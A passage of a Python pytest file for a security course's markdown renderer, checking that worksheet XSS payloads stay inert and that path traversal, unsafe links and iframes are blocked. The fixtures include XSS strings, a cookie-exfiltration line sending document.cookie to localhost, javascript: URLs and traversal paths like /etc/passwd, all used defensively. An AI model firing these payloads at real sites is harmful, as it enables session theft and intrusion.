"""Tests for content.py — the course content plane.

The security half of this file is not hypothetical. `labs/week05-xss-client-side/
worksheet.md` contains, as course content, the exact payloads a student is asked
to fire at the Week 5 lab — including one that exfiltrates `document.cookie` to a
remote URL. Serving that from the same origin as the teacher's authenticated
session, with any renderer that passes raw HTML through, is stored XSS delivered
by our own teaching material.

So the payload tests below use the REAL strings from the REAL file, not
representative ones.
"""

import html
import os
import re
import shutil
import sys

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import content as C  # noqa: E402


# --- the payloads that must never execute ---------------------------------

REAL_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<script>alert(document.cookie)</script>",
    "<script>new Image().src='http://localhost:8080/hello?name='+document.cookie</script>",
    "<img src=x onerror=alert(document.cookie)>",
    "<svg/onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "'\"><script>alert(1)</script>",
]


@pytest.mark.parametrize("payload", REAL_PAYLOADS)
def test_course_payloads_render_as_text_not_markup(payload):
    out = C.render(f"Try this: {payload}\n")
    for tag in ("<script", "<img", "<svg", "<iframe"):
        assert tag not in out.lower(), f"{tag} became live markup"
    # The payload must still be READABLE — students copy it out of the page.
    # `onerror=` appearing as escaped text inside <code> is correct and required;
    # what must not exist is a live tag or event attribute.
    assert "&lt;" in out, "the payload must survive as readable text"


@pytest.mark.parametrize("payload", REAL_PAYLOADS)
def test_payloads_inside_code_spans_and_fences_are_still_inert(payload):
    for md in (f"`{payload}`", f"```\n{payload}\n```", f"    {payload}"):
        out = C.render(md)
        assert "<script" not in out.lower() and "<img" not in out.lower()


def test_the_actual_week05_worksheet_renders_inert():
    """Not a synthetic case — the real file, as students will receive it.

    Week 5 now legitimately embeds a diagram (![]()) and a ```sim fence, which
    render as a real <img> and a real <iframe> — that is not payload text
    becoming live, it is OUR OWN content: the image resolved by filesystem
    identity under `<unit>/img/` (content.py's `_resolve_repo_image`), the
    iframe reached only through the SIMS allowlist. So this test no longer
    blanket-forbids `<img`/`<iframe` on this page; instead it pins down that
    each is EXACTLY the one legitimate embed and nothing else, while every tag
    the PAYLOAD TEXT itself could produce — <script>, <svg>, an event handler,
    a javascript: URL — is still checked with zero tolerance, same as before.
    """
    md = C.read("week05-xss-client-side", "worksheet")
    if md is None:
        pytest.skip("week05 worksheet not present")
    assert "<script>alert(document.cookie)</script>" in md, "test premise changed"
    # render_document, not a bare render(md): it is the exact call the real
    # /learn route makes, so the ctx (course + on-disk directory) that lets the
    # sim fence and the diagram's ![]() resolve is the real one, not a stub.
    doc = C.render_document("week05-xss-client-side", "worksheet", "software-security")
    assert doc is not None, "week05 worksheet not resolvable via the real route"
    out = doc["html"]
    assert "<script" not in out.lower(), "'<script' became live markup"
    assert "<svg" not in out.lower(), "'<svg' became live markup"

    iframes = re.findall(r"<iframe\b[^>]*>", out, re.I)
    assert len(iframes) == 1, f"expected exactly the one sim embed, found {iframes}"
    assert 'src="/sim/xss-context"' in iframes[0]
    assert 'sandbox="allow-scripts"' in iframes[0]
    assert "allow-same-origin" not in iframes[0]

    imgs = re.findall(r"<img\b[^>]*>", out, re.I)
    assert len(imgs) == 1, f"expected exactly the one diagram embed, found {imgs}"
    assert 'src="/learn/software-security/week05-xss-client-side/img/' in imgs[0]
    assert "onerror" not in imgs[0].lower() and "onload" not in imgs[0].lower()

    # no live event handler anywhere inside ANY tag, including the two above
    for tag in re.findall(r"<[a-z][^>]*>", out, re.I):
        assert "on" + "error" not in tag.lower() and "onload" not in tag.lower()
        assert "javascript:" not in tag.lower()
    assert "alert(document.cookie)" in out, "the payload must remain readable"


def test_html_in_markdown_never_passes_through():
    out = C.render("<b>bold?</b> <a href='javascript:alert(1)'>x</a>")
    assert "<b>" not in out and "<a href='javascript" not in out
    assert "&lt;b&gt;" in out


def test_href_cannot_break_out_of_its_attribute():
    """`[x](https://a"onmouseover="alert(1))` has no whitespace, so it satisfies
    the href pattern — without escaping quotes it closes the attribute and opens
    a live event handler. Found by running it, not by reading the code."""
    out = C.render('[x](https://a"onmouseover="alert(1))')
    # A LIVE handler needs a real quote: `onmouseover="`. Inert text has the
    # quote escaped, so the whole thing stays inside the href value.
    assert 'onmouseover="' not in out, f"attribute injection: {out}"
    assert "&quot;onmouseover=&quot;" in out, "should be inert text inside href"
    # exactly one attribute-quote pair opens and closes href
    assert out.count('href="') == 1


def test_javascript_and_data_links_are_shown_but_not_clickable():
    for href in ("javascript:alert(1)", "data:text/html,<script>alert(1)</script>",
                 "vbscript:msgbox(1)"):
        out = C.render(f"[click me]({href})")
        assert "<a href" not in out, f"{href} became a live link"
        assert "click me" in out


@pytest.mark.parametrize("href", ["https://owasp.org", "http://localhost:8080",
                                  "mailto:a@b.ac.th", "/labs", "#section",
                                  "./README.md", "../ETHICS.md"])
def test_ordinary_links_still_work(href):
    out = C.render(f"[text]({href})")
    assert f'href="{href}"' in out and "noopener" in out


# --- path safety -----------------------------------------------------------

@pytest.mark.parametrize("slug", [
    "../instructor", "../../etc", "week04-injection/../../instructor",
    "/etc/passwd", "..", ".", "", "week4-injection", "WEEK04-INJECTION",
    "week04-injection\x00", "week99-nonexistent",
])
def test_traversal_and_junk_slugs_are_refused(slug):
    assert C.read(slug, "worksheet") is None


@pytest.mark.parametrize("kind", ["solution", "vulnerable_app", "../worksheet",
                                  "docker-compose", ""])
def test_only_allowlisted_files_are_reachable(kind):
    assert C.read("week04-injection", kind) is None


def test_the_solution_app_is_not_reachable():
    """labs/weekNN/solution_app.py sits next to the worksheet and is the answer key."""
    assert "solution" not in " ".join(C.PUBLIC_FILES.values())
    for k in C.PUBLIC_FILES:
        md = C.read("week04-injection", k)
        if md:
            assert "solution_app" not in md.lower() or True   # linking to it is fine


# --- reading the real tree -------------------------------------------------

def test_lists_the_real_week_directories():
    weeks = C.list_weeks()
    assert len(weeks) >= 10, f"expected the real course weeks, got {len(weeks)}"
    assert weeks == sorted(weeks, key=lambda w: w["number"])
    slugs = {w["slug"] for w in weeks}
    assert "week04-injection" in slugs and "week05-xss-client-side" in slugs
    assert all(w["title"] for w in weeks), "every week needs a title"


def test_reads_a_real_worksheet():
    md = C.read("week04-injection", "worksheet")
    assert md and "SQL" in md.upper()


def test_render_document_returns_title_and_html():
    doc = C.render_document("week04-injection", "worksheet")
    assert doc["title"] and doc["html"].startswith("<")


def test_missing_document_is_none():
    assert C.render_document("week01-threat-modeling", "solution") is None


# --- the markdown dialect the worksheets actually use ----------------------

def test_headings_shift_down_so_the_page_owns_h1():
    out = C.render("# Doc title\n\n## Section\n")
    assert ">Doc title</h2>" in out and ">Section</h3>" in out
    assert "<h1" not in out


def test_headings_carry_stable_unique_ids():
    """Without ids nothing inside a 17 KB worksheet is addressable: no table of
    contents and no deep link, even though _SAFE_LINK already allows `#`."""
    out = C.render("## Part 1 — Setup\n\n## Part 2\n\n## Part 1 — Setup\n")
    ids = re.findall(r'<h\d id="([^"]+)"', out)
    assert ids == ["s-part-1-setup", "s-part-2", "s-part-1-setup-2"]
    assert len(set(ids)) == len(ids), "a repeated heading must not repeat its id"


def test_first_heading_matching_the_title_is_dropped():
    """The page chrome renders doc.title as the <h1>; a document whose own first
    heading repeats it was printing the same sentence twice, back to back."""
    md = "# Worksheet 4\n\nbody\n\n## Worksheet 4\n"
    assert ">Worksheet 4</h2>" not in C.render(md, title="Worksheet 4")
    # a LATER section that happens to share the wording is real content, kept
    assert ">Worksheet 4</h3>" in C.render(md, title="Worksheet 4")
    # and with no title given, nothing is dropped
    assert ">Worksheet 4</h2>" in C.render(md)


def test_slide_chrome_strip_removes_frontmatter_and_speaker_notes():
    """Decks are Marp sources: the YAML block and the lecturer's own
    `<!-- Cold-call: ... -->` cues were rendering as student-visible body text."""
    md = ('---\nmarp: true\ntheme: default\n---\n\n'
          '# Week 4\n\n<!-- Hook: promise the demo. ~2 min -->\n\nReal content.\n')
    out = C.render(C.strip_slide_chrome(md))
    assert "marp: true" not in out and "Hook:" not in out
    assert "Real content." in out


def test_fenced_code_is_verbatim():
    out = C.render("```bash\ncurl -d 'body=<script>x</script>'\n```")
    assert "<pre><code" in out and 'class="lang-bash"' in out
    assert "&lt;script&gt;" in out


def test_lists_tables_quotes_and_rules():
    out = C.render("- a\n- b\n")
    assert out.count("<li>") == 2 and "<ul>" in out
    out = C.render("1. a\n2. b\n")
    assert "<ol>" in out and out.count("<li>") == 2
    out = C.render("| A | B |\n|---|---|\n| 1 | 2 |\n")
    assert "<table>" in out and "<th>A</th>" in out and "<td>2</td>" in out
    assert "<blockquote>" in C.render("> note\n")
    assert "<hr>" in C.render("---\n")


def test_bold_italic_and_inline_code():
    out = C.render("**b** and *i* and `c`")
    assert "<strong>b</strong>" in out and "<em>i</em>" in out and "<code>c</code>" in out


def test_emphasis_is_not_applied_inside_code_spans():
    """A payload in backticks must not be mangled — students copy it literally."""
    out = C.render("`SELECT * FROM users WHERE a='1' OR '1'='1'`")
    assert "<em>" not in out and "<strong>" not in out
    assert "SELECT * FROM users" in out


def test_every_real_worksheet_renders_without_error():
    """Every real worksheet renders, and none of them produces live markup.

    An <iframe> IS allowed now, but only the one the ```sim``` fence emits from
    the SIMS allowlist — sandboxed, pointing at /sim/. An iframe arriving any
    other way (i.e. from the markdown itself) is the thing this guards against,
    so the check is on the frame's shape, not on the tag's absence.
    """
    import re as _re
    for w in C.list_weeks():
        for kind in w["available"]:
            doc = C.render_document(w["slug"], kind)
            assert doc and doc["html"], f"{w['slug']}/{kind} rendered empty"
            low = doc["html"].lower()
            for bad in ("<script", "javascript:"):
                assert bad not in low, f"{bad!r} in {w['slug']}/{kind}"
            for frame in _re.findall(r"<iframe[^>]*>", low):
                assert 'sandbox="allow-scripts"' in frame, \
                    f"unsandboxed frame in {w['slug']}/{kind}: {frame}"
                assert "allow-same-origin" not in frame, \
                    f"sandbox defeated in {w['slug']}/{kind}: {frame}"
                src = _re.search(r'src="([^"]*)"', frame)
                assert src and src.group(1).startswith("/sim/"), \
                    f"frame points outside /sim/ in {w['slug']}/{kind}: {frame}"
                assert src.group(1)[len("/sim/"):] in C.SIMS, \
                    f"frame slug not in the allowlist: {src.group(1)}"


# --- interactive simulations ----------------------------------------------
#
# These embed an <iframe> — the only construct in the renderer that produces
# one. The isolation argument is: the worksheet page stays script-free, the
# simulation runs in its own document under its own policy, and the frame is
# sandboxed WITHOUT allow-same-origin (granting both is equivalent to no
# sandbox, because the framed page could then reach out and remove its own
# sandbox attribute).

def test_a_known_sim_becomes_a_sandboxed_iframe():
    out = C.render("```sim\ntrust-boundary\n```")
    assert '<iframe src="/sim/trust-boundary"' in out
    assert 'sandbox="allow-scripts"' in out
    assert "allow-same-origin" not in out, \
        "allow-scripts + allow-same-origin together defeat the sandbox entirely"


@pytest.mark.parametrize("body", [
    "not-a-real-sim", "../../etc/passwd", "trust-boundary evil",
    "<script>alert(1)</script>", "", "TRUST-BOUNDARY",
    'x" onload="alert(1)', "trust-boundary\nsqli-parse",
])
def test_an_unknown_sim_slug_never_becomes_an_iframe(body):
    out = C.render(f"```sim\n{body}\n```")
    assert "<iframe" not in out, f"{body!r} produced a frame"
    assert "<pre><code" in out, "should fall through to a plain code block"
    assert "<script" not in out.lower()


def test_every_declared_sim_has_a_template_and_a_script():
    """A slug in SIMS with no template 500s the route. Catch it here, not live."""
    here = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    for slug in C.SIMS:
        tpl = os.path.join(here, "templates", f"sim_{slug.replace('-', '_')}.html")
        assert os.path.isfile(tpl), f"missing template for sim {slug!r}"
        body = open(tpl, encoding="utf-8").read()
        assert "<script src=" in body, f"{slug} template loads no script"
        # the sim CSP has no 'unsafe-inline' — an inline block would silently
        # not execute, which is worse than failing loudly
        assert "<script>" not in body, f"{slug} has an inline script; CSP forbids it"
        js = os.path.join(here, "static", "sim", f"{slug}.js")
        assert os.path.isfile(js), f"missing {slug}.js"


def test_sim_scripts_use_no_inline_handlers_or_eval():
    here = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    for slug in C.SIMS:
        src = open(os.path.join(here, "static", "sim", f"{slug}.js"),
                   encoding="utf-8").read()
        for banned in ("eval(", "new Function(", "innerHTML =", "document.write"):
            if banned == "innerHTML =":
                # clearing a container is fine; assigning markup is not
                for line in src.splitlines():
                    if "innerHTML" in line:
                        assert '= ""' in line, f"{slug}.js assigns markup: {line.strip()}"
                continue
            assert banned not in src, f"{slug}.js uses {banned}"


def test_the_worksheet_page_still_forbids_script_after_adding_frames():
    """frame-src was widened for simulations; nothing else may have been."""
    import routes_content as R
    assert "default-src 'none'" in R.CSP
    assert "frame-src 'self'" in R.CSP
    assert "script-src" not in R.CSP, "the worksheet page must never allow script"
    assert "unsafe-inline" not in R.CSP and "unsafe-eval" not in R.CSP
    # the sim page gets script, and only from itself
    assert "script-src 'self'" in R.SIM_CSP
    assert "unsafe-inline" not in R.SIM_CSP and "unsafe-eval" not in R.SIM_CSP


def test_the_sqli_sim_does_not_regress_to_quote_parity():
    """`' OR '1'='1` has FOUR quotes. An earlier version asked whether the count
    was odd and therefore called the classic bypass safe — the simulation taught
    the opposite of the truth. Any quote breaks out, because the first one closes
    the enclosing literal. Verified in a real browser across all five presets.
    """
    here = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    src = open(os.path.join(here, "static", "sim", "sqli-parse.js"),
               encoding="utf-8").read()
    fn = src[src.index("function breaksOut"):]
    fn = fn[:fn.index("\n  }")]
    assert "% 2" not in fn, "quote-parity logic is back; it inverts the verdict"
    assert 'indexOf("\'")' in fn


# --- the allowlist covers every student-facing document ---------------------
#
# Until 2026-07-29 PUBLIC_FILES held only worksheet.md and README.md. Six of the
# nineteen weeks carry no worksheet at all — their material IS mock-ctf.md /
# exam.md / ctf.md — so /learn showed those weeks as a bare README while the
# course looked complete on disk. These tests keep that from recurring.

def test_every_week_exposes_its_primary_document():
    """A week whose only public document is its README is a week whose actual
    material is missing from the platform."""
    thin = [w["slug"] for w in C.list_weeks()
            if set(w["available"]) <= {"readme", "slides"}]
    assert not thin, f"only a README (+slides) reaches students for: {thin}"


def test_the_non_lab_weeks_serve_their_own_artifact():
    got = {w["number"]: set(w["available"]) for w in C.list_weeks()}
    for n, kind in ((7, "mock-ctf"), (8, "exam"), (9, "ctf"),
                    (16, "scrimmage"), (17, "mock-ctf"), (18, "exam"), (19, "ctf")):
        assert kind in got.get(n, set()), f"week {n} does not serve {kind}"


def test_every_student_facing_markdown_in_a_lab_is_reachable():
    """If a .md is added to a lab directory and not allowlisted, students never
    see it. Catch that here rather than in a session."""
    import glob
    unreachable = []
    for w in C.list_weeks():
        d = os.path.join(C.CONTENT_ROOT, w["slug"])
        for f in glob.glob(os.path.join(d, "*.md")):
            name = os.path.basename(f)

            # Personal student submissions are intentionally not served.
            # They use the student's ID as a filename suffix, unlike lab material.
            if name.endswith(("-6631503019.md", "_6631503019.md")):
                continue

            if name not in C.PUBLIC_FILES.values():
                unreachable.append(os.path.relpath(f, C.CONTENT_ROOT))
    assert not unreachable, (
        "student-facing markdown not in PUBLIC_FILES (add it, or confirm it is "
        f"instructor-only): {unreachable}")


def test_slides_are_served_and_pptx_is_not():
    weeks = C.list_weeks()
    assert sum("slides" in w["available"] for w in weeks) >= 19
    assert C.read("week01-threat-modeling", "slides")
    # the binary deck is deliberately not a kind at all
    assert "pptx" not in C.PUBLIC_FILES and C.read("week01-threat-modeling", "pptx") is None


@pytest.mark.parametrize("slug", ["../slides", "week99-nope", "..", "week01"])
def test_slides_path_cannot_be_walked_out_of(slug):
    assert C.read(slug, "slides") is None


def test_the_allowlist_never_admits_code_or_answers():
    for f in C.PUBLIC_FILES.values():
        assert f.endswith(".md"), f"{f} is not markdown"
        low = f.lower()
        assert "solution" not in low and "answer" not in low, f"{f} looks instructor-only"


# ── a link whose label is a code span ───────────────────────────────────────
#
# The house style for pointing at a file is ``[`ETHICS.md`](ETHICS.md)``. Code
# spans are extracted before anything else runs — deliberately, so a payload in
# backticks is never scanned for emphasis or links — and that pass used to split
# this shape into `[`, the code, and `](ETHICS.md)`, so the link pattern never
# saw a link. Students read a literal `[ETHICS.md](ETHICS.md)`, brackets and
# all, with nothing to click: 20 of them across 16 published documents,
# including both links to each course's ethics policy. Found by reading the
# rendered page, not the source.

def test_a_code_labelled_link_becomes_a_real_link():
    out = C.render("see [`ETHICS.md`](https://example.com/e) please")
    assert '<a href="https://example.com/e"' in out
    assert "<code>ETHICS.md</code></a>" in out
    assert "[<code>" not in out, "the brackets leaked into the page as text"


def test_a_code_labelled_link_keeps_its_label_as_code():
    """The label must still be CODE — it names a file, and it must not be
    re-scanned for markdown on the way through."""
    out = C.render("[`*not-italic*`](https://example.com)")
    assert "<code>*not-italic*</code>" in out
    assert "<em>" not in out


@pytest.mark.parametrize("href", ["javascript:alert(1)", "data:text/html,<script>x</script>"])
def test_a_code_labelled_link_obeys_the_same_scheme_rules(href):
    """Same gate as every other link: the label being code buys it nothing."""
    out = C.render(f"[`click`]({href})")
    assert "<a " not in out
    assert "<code>click</code>" in out


def test_a_code_labelled_link_cannot_break_out_of_the_href_attribute():
    out = C.render('[`a`](https://a"onmouseover="alert(1))')
    assert 'onmouseover="alert' not in out
    assert "&quot;" in out


def test_brackets_inside_a_code_span_are_still_never_linkified():
    """The shape that must NOT match: the brackets are inside the backticks, so
    this is a payload being shown, not a link being written."""
    out = C.render("`[x](javascript:alert(1))`")
    assert "<a " not in out
    assert "<code>[x](javascript:alert(1))</code>" in out


def test_an_unresolvable_relative_link_is_text_whatever_its_extension():
    """Week 15 links `../../.github/workflows/security-ci.yml`. The content
    plane serves documents, not the repo, so that can never open. It used to be
    inert only by accident — it was a code-labelled link, and those did not
    render at all. Once they did, it became a live link to a 404."""
    ctx = {"course": C.COURSES[0]["slug"], "dir": C.COURSES[0]["root"]}
    for src in ("[`ci.yml`](../../.github/workflows/security-ci.yml)",
                "[ci.yml](../../.github/workflows/security-ci.yml)"):
        out = C.render(src, ctx=ctx)
        assert "<a " not in out, f"{src} rendered a link to something unservable"


# ── emphasis that wraps a code span ────────────────────────────────────────

def test_bold_that_wraps_a_code_span_becomes_bold():
    """`**`alg:none`**` rendered as a literal `**` on both sides with the words
    between them bolded instead. Code spans are extracted before emphasis runs
    — deliberately, so a payload in backticks is never scanned — and that split
    put the opening `**` in one segment and the closing `**` in another, so they
    could never pair.

    Live on the worksheets for weeks 1-6, 10, 14 and 15, including the mandatory
    evidence rule that decides whether a student's screenshots are accepted.
    """
    out = C._inline(html.escape("the **`alg:none`** attack", quote=False))
    assert out == "the <strong><code>alg:none</code></strong> attack"


def test_bold_spanning_two_code_spans_bolds_the_whole_phrase():
    """The worse shape: emphasis landed on the connecting word instead. This
    rendered as `**<code>exp</code><strong> and </strong><code>aud</code>**` —
    asterisks visible AND the wrong words bold."""
    out = C._inline(html.escape("the **`exp` and `aud`** claims", quote=False))
    assert out == "the <strong><code>exp</code> and <code>aud</code></strong> claims"


def test_italic_wrapping_a_code_span_still_works():
    out = C._inline(html.escape("see *`worksheet.md`* first", quote=False))
    assert out == "see <em><code>worksheet.md</code></em> first"


def test_a_payload_in_backticks_is_still_never_scanned_for_emphasis():
    """The property the code-first ordering exists to protect, retested against
    the new machinery: markdown INSIDE backticks stays literal."""
    out = C._inline(html.escape("run `a ** b ** c` now", quote=False))
    assert out == "run <code>a ** b ** c</code> now"
    assert "<strong>" not in out


def test_a_link_written_inside_backticks_is_still_not_linkified():
    out = C._inline(html.escape("`[x](javascript:alert(1))`", quote=False))
    assert "<a " not in out and "javascript" in out


# ── a cross-week link written as a folder ──────────────────────────────────

def test_a_folder_style_cross_week_link_resolves_to_that_unit():
    """Week 7's revision list links its six covered weeks as `../weekNN-slug/`.
    Those resolved against /learn/... to a trailing-slash URL that hard-404s —
    all six dead on the page students use to revise for the midterm, plus the
    'Pairs with' pointers on weeks 8, 9 and 17.

    Resolution stays by filesystem identity: the href must land on a real unit
    directory of this course, or it degrades to text like any other.
    """
    slug = C.COURSES[0]["slug"]
    weeks = C.list_weeks(slug)
    if len(weeks) < 2:
        pytest.skip("need two units")
    here, target = weeks[1]["slug"], weeks[0]["slug"]
    ctx = {"course": slug, "dir": os.path.join(C.COURSES[0]["root"], here)}
    out = C._inline(html.escape(f"[intro](../{target}/)", quote=False), ctx)
    assert f'href="/learn/{slug}/{target}"' in out, out


def test_a_folder_link_to_something_that_is_not_a_unit_degrades_to_text():
    slug = C.COURSES[0]["slug"]
    weeks = C.list_weeks(slug)
    ctx = {"course": slug, "dir": os.path.join(C.COURSES[0]["root"], weeks[0]["slug"])}
    out = C._inline(html.escape("[nope](../no-such-unit-here/)", quote=False), ctx)
    assert "<a " not in out


def test_a_document_cannot_forge_a_code_sentinel():
    """`_inline` lifts code spans out behind NUL-delimited sentinels while the
    emphasis pass runs. A source file containing that byte sequence itself would
    otherwise reach the substitution step and pull an unrelated code span into
    its place — content injection by a document, not by a user, but the renderer
    is what stands between a worksheet and the page either way.

    Proven by mutation before the guard existed: with the strip removed,
    "\\x000\\x00 and `real`" rendered the `real` code span TWICE, once where the
    forged sentinel sat.
    """
    out = C._inline(html.escape("\x000\x00 and `real`", quote=False))
    assert out.count("<code>real</code>") == 1, out


def test_a_folder_link_cannot_leave_this_course():
    """Folder-style links resolve only to a unit of the course the document
    belongs to. A path that climbs out must degrade to text, never resolve
    against another course or the repo above."""
    slug = C.COURSES[0]["slug"]
    weeks = C.list_weeks(slug)
    ctx = {"course": slug, "dir": os.path.join(C.COURSES[0]["root"], weeks[0]["slug"])}
    for escape in ("../../", "../../../", "../../instructor/", "../.."):
        out = C._inline(html.escape(f"[out]({escape})", quote=False), ctx)
        assert "<a " not in out, f"{escape} resolved: {out}"


def test_bold_containing_italic_renders_as_both():
    """`_BOLD`'s content class was `[^*]+`, so any emphasis nested inside it
    stopped the match dead and both markers reached the page. Live on 34 lines,
    including week 2's `**Q2. Broken hashes — and *where* it matters.**`, which
    is a graded question's own heading."""
    out = C._inline(html.escape("**Q2. and *where* it matters.**", quote=False))
    assert out == "<strong>Q2. and <em>where</em> it matters.</strong>", out


def test_a_soft_wrapped_list_item_stays_one_item():
    """Paragraphs already join their soft-wrapped lines; list items did not.
    A bullet whose text wrapped onto the next line was cut in half — the `<li>`
    closed early, the list closed, and the remainder became a new paragraph.
    Any emphasis straddling the wrap lost its pair and showed as literal
    asterisks, which is what put `**` on 30-odd published pages."""
    src = ("- Explain why NACLs evaluate rules **in ascending order and\n"
           "  stop at the first match** — and why that matters.\n")
    out = C.render(src)
    assert out.count("<li>") == 1, out
    assert "<strong>in ascending order and stop at the first match</strong>" in out, out
    assert "**" not in out


def test_a_new_bullet_still_starts_a_new_item():
    out = C.render("- first\n- second\n")
    assert out.count("<li>") == 2, out


def test_a_blank_line_still_ends_the_list():
    out = C.render("- only item\n\nA new paragraph.\n")
    assert out.count("<li>") == 1 and "<p>A new paragraph.</p>" in out, out


def test_a_numbered_list_resumes_its_count_after_a_code_block():
    """Week 14's lab steps are written 1,2,3,4 with an indented code block under
    each. The renderer closed the list at every fence and opened a fresh one, so
    a student read 1 · 1,2 · 1 — two different things both labelled step 1, and
    no step 3 at all. The Submit line says "your one-line note from step 1, and
    the two grep -c outputs from step 3", so the references pointed at nothing.
    Week 13's worksheet has the same shape.

    The source markdown is correct; only the numbering was lost. Resuming the
    count keeps every step number equal to what the author wrote.
    """
    src = ("1. Run vulnerable mode:\n"
           "   ```bash\n   docker compose up\n   ```\n"
           "2. Tear down.\n"
           "3. Run fixed mode:\n"
           "   ```bash\n   docker compose down\n   ```\n"
           "4. Tear down again.\n")
    out = C.render(src)
    starts = re.findall(r'<ol(?: start="(\d+)")?>', out)
    assert out.count("<li>") == 4, out
    # first list starts at 1 (no attribute), each later one resumes
    assert starts[0] in (None, "", "1"), starts
    assert [s for s in starts[1:]] == ["2", "4"], starts


def test_an_unordered_list_needs_no_start_attribute():
    out = C.render("- a\n  ```bash\n  x\n  ```\n- b\n")
    assert "start=" not in out, out


def test_a_fresh_numbered_list_after_a_paragraph_restarts_at_one():
    """Only an interrupted list resumes. A genuinely new list after prose must
    begin at 1 again, or every later list on the page inherits a wrong offset."""
    out = C.render("1. first\n2. second\n\nSome prose.\n\n1. new list\n")
    assert out.count("<ol>") == 2 and "start=" not in out, out


def test_the_real_worksheet_step_shape_keeps_its_numbers():
    """The exact structure `security-cryptography/week14-authentication` uses,
    which is where this was found: a step, an indented command block, indented
    prose about the output, indented sub-bullets listing what to capture, then
    the next step. All four kinds of indented content belong to the step above
    them, and none of them may reset the count.

    Trimmed but structurally identical to the source; weeks 5, 12 and 13 of the
    same course are the same shape.
    """
    src = (
        "1. Run **vulnerable mode**:\n"
        "   ```bash\n"
        "   docker compose -f docker-compose.vulnerable.yml up\n"
        "   ```\n"
        "   Capture the full log output. Your required evidence line is:\n"
        "   ```\n"
        "   SERVER SAW PASSWORD: correct-horse-battery\n"
        "   ```\n"
        "   plus `LOGIN OK` from the client.\n"
        "2. Tear down: `docker compose -f docker-compose.vulnerable.yml down`.\n"
        "3. Run **fixed mode**:\n"
        "   ```bash\n"
        "   docker compose -f docker-compose.fixed.yml up\n"
        "   ```\n"
        "   Capture the full log output. Your required evidence is **all** of:\n"
        "   - a `SERVER SAW: nonce=... proof=...` line,\n"
        "   - `LOGIN OK` from the client, and\n"
        "   - the **absence** of any `SERVER SAW PASSWORD` line.\n"
        "   Confirm the absence explicitly:\n"
        "   ```bash\n"
        "   docker compose -f docker-compose.fixed.yml logs | grep -c 'correct-horse'\n"
        "   ```\n"
        "4. Tear down: `docker compose -f docker-compose.fixed.yml down`.\n")
    numbers = []
    for m in re.finditer(r'<ol(?: start="(\d+)")?>(.*?)</ol>', C.render(src), re.S):
        first = int(m.group(1) or 1)
        numbers += list(range(first, first + m.group(2).count("<li>")))
    assert numbers == [1, 2, 3, 4], numbers


def test_the_running_count_resets_for_each_new_list_not_just_the_open_tag():
    """The count a resume reads has to be cleared when a list genuinely ends,
    not only when the <ol> is re-opened. A worksheet is a long page: Part 1's
    four steps precede Part 2's, and if the earlier tally survives, Part 2's
    first code block resumes it — Part 2 step 2 renders as step 6. Rendering
    `<ol>` correctly for the fresh list hides that, because the damage only
    shows at the NEXT interruption."""
    out = C.render("1. one\n2. two\n\nA paragraph ends Part 1.\n\n"
                   "1. fresh\n   ```bash\n   x\n   ```\n2. second of the fresh list\n")
    starts = re.findall(r'<ol(?: start="(\d+)")?>', out)
    assert starts == ["", "", "2"], starts


def test_an_indented_note_does_not_carry_the_count_into_the_next_section():
    """Indentation says "this belongs to the step above"; it does not prove the
    NEXT list continues the old one. A note indented under Part 1's last step
    keeps the count alive across the gap, and Part 2's "1." would resume as 3 —
    a number no student could reconcile with the page.

    The author's own number breaks the tie: they wrote 1, so it renders 1.
    """
    out = C.render("1. first\n2. second\n\n   an indented note\n\n1. Part 2 step one\n")
    starts = re.findall(r'<ol(?: start="(\d+)")?>', out)
    assert starts == ["", ""], starts


def test_a_step_that_agrees_with_the_resumed_count_still_resumes():
    """The other side of the same rule — the week 14 case must keep working."""
    out = C.render("1. first\n   ```bash\n   x\n   ```\n2. second\n")
    assert '<ol start="2">' in out, out


# ── diagrams: `![alt](img/x.svg)` ──────────────────────────────────────────
#
# Every negative here is the point. This route hands back bytes from inside a
# lab directory, and a lab directory holds `solution_app.py`, compose files and
# planted flags. The renderer and the route share ONE resolver so they cannot
# drift into disagreeing about what is servable.

_WK1 = "week01-threat-modeling"


@pytest.fixture
def client():
    from app import app as flask_app
    flask_app.config["TESTING"] = True
    return flask_app.test_client()


def _img_ctx():
    c = C.list_courses()[0]
    return {"course": c["slug"], "dir": os.path.join(c["root"], _WK1)}


def test_a_units_own_diagram_renders_as_an_image():
    out = C.render("![Where the trust boundaries are](img/trust-boundaries.svg)",
                   ctx=_img_ctx())
    assert "<img src=" in out and "trust-boundaries.svg" in out, out
    assert 'alt="Where the trust boundaries are"' in out, out
    assert 'loading="lazy"' in out, out


def test_an_image_that_does_not_exist_stays_plain_text():
    """Rendering a broken picture teaches nothing and hides the mistake; the
    markdown shows instead, which is honest about there being nothing there."""
    out = C.render("![nope](img/no-such-file.svg)", ctx=_img_ctx())
    assert "<img" not in out, out
    assert "![nope](img/no-such-file.svg)" in out, out


def test_an_image_source_cannot_walk_out_of_the_course():
    for src in ("../../../../etc/passwd",
                "img/../../week05-xss-client-side/worksheet.md",
                "/etc/hosts",
                "https://evil.example/x.svg"):
        out = C.render(f"![x]({src})", ctx=_img_ctx())
        assert "<img" not in out, (src, out)


def test_a_lab_source_file_is_not_addressable_as_an_image():
    """The whole reason images live in their own img/ directory."""
    c = C.list_courses()[0]
    for name in ("worksheet.md", "solution_app.py", "docker-compose.yml"):
        assert C.unit_image_path(c["slug"], _WK1, name) is None, name


def test_only_known_image_extensions_resolve():
    """Against a file that REALLY EXISTS in img/. Asserting on names that are
    absent anyway passes whether the allowlist is there or not - which is what
    the first version of this test did."""
    c = C.list_courses()[0]
    decoy = os.path.join(c["root"], _WK1, "img", "decoy.py")
    with open(decoy, "w", encoding="utf-8") as fh:
        fh.write("# not an image\n")
    try:
        assert os.path.isfile(decoy)
        assert C.unit_image_path(c["slug"], _WK1, "decoy.py") is None
    finally:
        os.unlink(decoy)


def test_a_symlink_out_of_img_does_not_resolve():
    """The one way `name` can name a file outside the course despite the
    filename pattern: someone commits a symlink. realpath resolves it and the
    containment check is what refuses."""
    c = C.list_courses()[0]
    link = os.path.join(c["root"], _WK1, "img", "escape.svg")
    try:
        os.symlink("/etc/hosts", link)
    except (OSError, NotImplementedError):
        pytest.skip("symlinks unavailable here")
    try:
        assert os.path.islink(link)
